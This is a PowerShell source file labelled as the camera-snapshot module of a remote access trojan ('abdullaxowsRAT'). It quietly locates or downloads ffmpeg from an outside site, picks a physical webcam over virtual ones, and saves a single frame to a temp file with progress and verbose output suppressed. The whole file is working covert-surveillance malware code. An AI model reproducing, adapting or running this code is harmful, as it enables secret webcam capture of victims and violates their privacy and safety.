<# 
abdullaxowsRAT - Camera Snapshot Script
#>

[CmdletBinding()]
param(
  [Parameter()] [string] $CameraName  = "",
  [Parameter()] [int]    $CameraIndex = 0,
  [Parameter()] [string] $Resolution  = "1280x720",
  [Parameter()] [string] $OutputPath  = "",
  [Parameter()] [int]    $TimeoutSec  = 15
)

$ErrorActionPreference = 'Stop'
$VerbosePreference     = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue' 

# ---------- Helpers ----------
function Ensure-FFmpeg {
  if ($env:FFMPEG_PATH -and (Test-Path $env:FFMPEG_PATH)) {
    return (Resolve-Path $env:FFMPEG_PATH).Path
  }

  $cmd = $null
  try { $cmd = Get-Command ffmpeg -ErrorAction SilentlyContinue } catch {}
  if (-not $cmd) {
    try { $cmd = Get-Command ffmpeg.exe -ErrorAction SilentlyContinue } catch {}
  }
  if ($cmd -and $cmd.Path -and (Test-Path $cmd.Path)) {
    return (Resolve-Path $cmd.Path).Path
  }

  $local = Join-Path (Get-Location) "bin\ffmpeg.exe"
  if (Test-Path $local) { return (Resolve-Path $local).Path }

  $candidates = @(
    "C:\ffmpeg\bin\ffmpeg.exe",
    "$env:ProgramFiles\FFmpeg\bin\ffmpeg.exe",
    "$env:ProgramFiles\ffmpeg\bin\ffmpeg.exe",
    "$env:ProgramFiles(x86)\FFmpeg\bin\ffmpeg.exe",
    "$env:ChocolateyInstall\bin\ffmpeg.exe"
  ) | Where-Object { $_ -and $_.Trim().Length -gt 0 }

  foreach ($p in $candidates) {
    if (Test-Path $p) { return (Resolve-Path $p).Path }
  }

  Write-Verbose "FFmpeg not found; downloading..."
  $zipUrl = 'https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip'
  $binDir = Join-Path (Get-Location) "bin"
  New-Item -ItemType Directory -Path $binDir -Force | Out-Null
  $tmpZip = Join-Path $env:TEMP ("ffmpeg_{0}.zip" -f ([DateTime]::Now.ToString("yyyyMMddHHmmss")))
  $tmpDir = Join-Path $env:TEMP ("ffmpeg_{0}" -f ([DateTime]::Now.ToString("yyyyMMddHHmmss")))
  New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null
  try {
    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
    Invoke-WebRequest -Uri $zipUrl -OutFile $tmpZip -UseBasicParsing -TimeoutSec 120
    Expand-Archive -Path $tmpZip -DestinationPath $tmpDir -Force
    $found = Get-ChildItem -Path $tmpDir -Recurse -Filter "ffmpeg.exe" -File | Select-Object -First 1
    if (-not $found) { throw "ffmpeg.exe not found in downloaded zip." }
    Copy-Item -Force $found.FullName $local
  } catch {
    throw "FFmpeg not found on PATH and auto-download failed: $($_.Exception.Message)"
  } finally {
    if (Test-Path $tmpZip) { Remove-Item $tmpZip -Force }
    if (Test-Path $tmpDir) { Remove-Item $tmpDir -Recurse -Force }
  }

  if (-not (Test-Path $local)) { throw "ffmpeg.exe copy failed." }
  return (Resolve-Path $local).Path
}

function Get-DShowVideoDevices([string]$ff) {
  $old = $ErrorActionPreference; $ErrorActionPreference = 'Continue'
  $lines = & $ff -hide_banner -f dshow -list_devices true -i dummy 2>&1
  $ErrorActionPreference = $old

  $result  = @()
  $pending = $null
  foreach ($line in $lines) {
    if ($line -match '^\[dshow[^\]]*\]\s*"([^"]+)"\s*\(([^)]+)\)') {
      $name = $matches[1]; $type = $matches[2]
      if ($type -eq 'video' -and $name -ne 'dummy') {
        $pending = [PSCustomObject]@{ Name = $name; AltName = $null }
        $result += $pending
      } else { $pending = $null }
      continue
    }
    if ($pending -ne $null -and $line -match '^\[dshow[^\]]*\]\s+Alternative name\s+"([^"]+)"') {
      $pending.AltName = $matches[1]; continue
    }
  }
  return $result
}

function Clean-Args([object[]]$arr) {
  $clean = @()
  foreach ($x in $arr) {
    if ($null -eq $x) { continue }
    $s = [string]$x
    if ($s.Trim().Length -eq 0) { continue }
    $clean += $s
  }
  return ,$clean
}

function Select-Camera($devices, [string]$name, [int]$index) {
  if (-not $devices -or $devices.Count -eq 0) { return $null }

  if ($name -and $name.Trim().Length -gt 0) {
    $exact = $devices | Where-Object { $_.Name -eq $name } | Select-Object -First 1
    if ($exact) { return $exact }
    $partial = $devices | Where-Object { $_.Name -like ("*" + $name + "*") } | Select-Object -First 1
    if ($partial) { return $partial }
  }

  $avoid = 'obs|virtual|snap|manycam|camlink virtual|ndi|avatar|fakecam'
  $physical = $devices | Where-Object { $_.Name -notmatch $avoid }
  if (-not $physical -or $physical.Count -eq 0) { $physical = $devices }

  # 3) If index valid → that, else fallback to first
  if ($index -ge 0 -and $index -lt $physical.Count) {
    return $physical[$index]
  }
  return $physical[0]
}

if ($null -eq $Resolution) { $Resolution = "1280x720" }
$Resolution = $Resolution.Trim("'`"").Trim()
if ($Resolution -notmatch '^\d+x\d+$') { throw "Resolution must be WxH (e.g. 1280x720). Got: '$Resolution'" }

if ($null -eq $OutputPath -or $OutputPath.Trim().Length -eq 0) {
  $OutputPath = Join-Path $env:TEMP ("webcam_{0}.jpg" -f ([DateTime]::Now.ToString("yyyyMMdd_HHmmss")))
}
$OutputPath = [System.IO.Path]::GetFullPath($OutputPath)
$null = New-Item -ItemType Directory -Force -Path ([System.IO.Path]::GetDirectoryName($OutputPath)) -ErrorAction SilentlyContinue

$ffmpeg  = Ensure-FFmpeg
$devices = Get-DShowVideoDevices -ff $ffmpeg
if (-not $devices -or $devices.Count -eq 0) { throw "No DirectShow video devices found by FFmpeg." }

$sel = Select-Camera -devices $devices -name $CameraName -index $CameraIndex
if (-not $sel) { throw "Could not select a camera." }

if ($sel.AltName) {
  $inputToken = 'video=' + $sel.AltName
} else {
  $qName = $sel.Name.Replace('"','""')
  $inputToken = 'video="' + $qName + '"'
}

Write-Verbose ("Selected camera: {0}" -f $sel.Name)
if ($sel.AltName) { Write-Verbose ("Alternative: {0}" -f $sel.AltName) }
Write-Verbose ("Resolution: {0}" -f $Resolution)
Write-Verbose ("Output: {0}" -f $OutputPath)

$args = Clean-Args @(
  '-nostdin','-hide_banner','-loglevel','error',
  '-y',
  '-f','dshow',
  '-rtbufsize','256M',
  '-video_size', $Resolution,
  '-i', $inputToken,            
  '-frames:v','1',
  '-q:v','2',
  '-f','image2','-update','1',
  $OutputPath
)

$errFile = [System.IO.Path]::GetTempFileName()
$outFile = [System.IO.Path]::GetTempFileName()
$p = Start-Process -FilePath $ffmpeg -ArgumentList $args -NoNewWindow -PassThru `
     -RedirectStandardError $errFile -RedirectStandardOutput $outFile

$finished = $p.WaitForExit([Math]::Max(1000, $TimeoutSec * 1000))
if (-not $finished -and -not $p.HasExited) { try { $p.Kill() } catch {} }

$code = $p.ExitCode
$stderr = ""; if (Test-Path $errFile) { try { $stderr = Get-Content $errFile -Raw } catch {} }
try { if (Test-Path $errFile) { Remove-Item $errFile -Force } } catch {}
try { if (Test-Path $outFile) { Remove-Item $outFile -Force } } catch {}

if ($code -ne 0 -or -not (Test-Path $OutputPath)) {
  Write-Host "[ffmpeg]" $ffmpeg
  Write-Host "[args  ]" ($args -join ' ')
  $tail = ($stderr -split "`r?`n") | Where-Object { $_ } | Select-Object -Last 80
  throw ("Snapshot failed.`n{0}" -f (($tail -join "`n")))
}

(Resolve-Path $OutputPath).Path
